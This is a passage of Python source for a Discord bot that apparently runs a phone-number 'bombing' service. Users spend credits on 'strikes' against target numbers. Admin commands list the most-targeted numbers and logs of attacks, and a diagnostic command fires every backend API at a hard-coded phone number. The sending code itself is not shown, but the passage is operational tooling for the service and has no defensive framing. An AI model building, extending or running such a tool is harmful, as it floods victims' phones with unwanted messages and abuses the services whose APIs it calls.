        await interaction.followup.send("❌ Self-transfer prohibited.", ephemeral=True)
        return

    sender = interaction.user.id
    if await has_unlimited_access(sender):
        await interaction.followup.send("❌ Unlimited operatives cannot transfer resources.", ephemeral=True)
        return

    balance = await fetch_balance(sender)
    if balance < amount:
        await interaction.followup.send(f"❌ Insufficient assets. Available: **{balance}**.", ephemeral=True)
        return

    await decrease_balance(sender, amount)
    await increase_balance(member.id, amount)

    embed = discord.Embed(title="💸 TRANSFER COMPLETE", color=COLOR_SUCCESS)
    embed.add_field(name="FROM", value=interaction.user.mention, inline=True)
    embed.add_field(name="TO", value=member.mention, inline=True)
    embed.add_field(name="AMOUNT", value=f"**{amount}** credits", inline=True)
    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="system_restart", description="[HIGH COMMAND] Reboot system")
async def system_restart(interaction: discord.Interaction):
    if not is_authorized(interaction):
        await interaction.response.send_message("❌ Command requires high clearance.", ephemeral=True)
        return
    await interaction.response.send_message("🔄 REBOOT SEQUENCE INITIATED...", ephemeral=True)
    await client.close()
    os.execv(sys.executable, [sys.executable] + sys.argv)

@tree.command(name="diagnostic_scan", description="[HIGH COMMAND] API status check")
async def diagnostic_scan(interaction: discord.Interaction):
    if not is_authorized(interaction):
        await interaction.response.send_message("❌ Restricted command.", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)
    test_target = "0506500708"
    success, failures = await execute_all(test_target)
    total = success + len(failures)

    embed = discord.Embed(title="📡 SYSTEM DIAGNOSTIC", color=COLOR_INFO)
    embed.add_field(name="✅ ONLINE", value=str(success), inline=True)
    embed.add_field(name="❌ OFFLINE", value=str(len(failures)), inline=True)
    embed.add_field(name="🔢 TOTAL SCANNED", value=str(total), inline=True)

    if failures:
        failed_text = ", ".join(failures)
        if len(failed_text) > 1024:
            failed_text = failed_text[:1020] + "..."
        embed.add_field(name="OFFLINE NODES:", value=failed_text, inline=False)

    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="mission_logs", description="[HIGH COMMAND] View recent operations")
@app_commands.describe(limit="Number of entries (1-50)")
async def mission_logs(interaction: discord.Interaction, limit: int = 10):
    if not is_authorized(interaction):
        await interaction.response.send_message("❌ Authorization required.", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)
    logs = await get_all_history(min(limit, 50))

    if not logs:
        await interaction.followup.send("📭 No records found.", ephemeral=True)
        return

    embed = discord.Embed(title="📋 OPERATION LOGS", color=COLOR_INFO)
    for log in logs[:10]:
        embed.add_field(
            name=f"{log['username']} | {log['date']} {log['time']}",
            value=f"🎯 {log['phone']}\n✅ {log['success_count']} | ❌ {log['failed_count']} | 💎 {log['cost']}",
            inline=False
        )

    if len(logs) > 10:
        embed.set_footer(text=f"+ {len(logs) - 10} additional records")

    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="top_targets", description="[HIGH COMMAND] Most targeted numbers")
async def top_targets(interaction: discord.Interaction):
    if not is_authorized(interaction):
        await interaction.response.send_message("❌ Insufficient permissions.", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)
    targets = await get_top_targets(10)

    if not targets:
        await interaction.followup.send("📭 No data available.", ephemeral=True)
        return

    embed = discord.Embed(title="🎯 MOST TARGETED NUMBERS", color=COLOR_INFO)
    for idx, target in enumerate(targets, 1):
        embed.add_field(
            name=f"{idx}. {target['_id']}",
            value=f"Strikes: {target['count']} | Success: {target['success_total']}",
            inline=False
        )

    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="global_analysis", description="[HIGH COMMAND] Global statistics")
async def global_analysis(interaction: discord.Interaction):
    if not is_authorized(interaction):
        await interaction.response.send_message("❌ Command restricted.", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)
    stats = await get_global_stats()

    if not stats:
        await interaction.followup.send("📭 No data available.", ephemeral=True)
        return

    embed = discord.Embed(title="📊 GLOBAL ANALYSIS", color=COLOR_INFO)
    embed.add_field(name="🎯 TOTAL STRIKES", value=str(stats.get("total_missions", 0)), inline=True)
    embed.add_field(name="👥 UNIQUE OPERATIVES", value=str(stats.get("unique_users", 0)), inline=True)
    embed.add_field(name="💎 RESOURCES CONSUMED", value=str(stats.get("total_cost", 0)), inline=True)
    embed.add_field(name="✅ TOTAL SUCCESS", value=str(stats.get("total_success", 0)), inline=True)
    embed.add_field(name="❌ TOTAL FAILURES", value=str(stats.get("total_failed", 0)), inline=True)
    embed.add_field(name="📨 TOTAL REQUESTS", value=str(stats.get("total_requests", 0)), inline=True)

    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="personal_history", description="View your operation history")
async def personal_history(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    logs = await get_user_history(interaction.user.id, 10)

    if not logs:
        await interaction.followup.send("📭 No operation records found.", ephemeral=True)
        return

    embed = discord.Embed(title="📋 PERSONAL OPERATION LOG", color=COLOR_INFO)
    for log in logs:
        embed.add_field(
            name=f"{log['date']} {log['time']}",
            value=f"🎯 {log['phone']}\n✅ {log['success_count']} | ❌ {log['failed_count']} | 💎 {log['cost']}",
            inline=False
        )

    await interaction.followup.send(embed=embed, ephemeral=True)

if __name__ == "__main__":
    client.run(TOKEN)
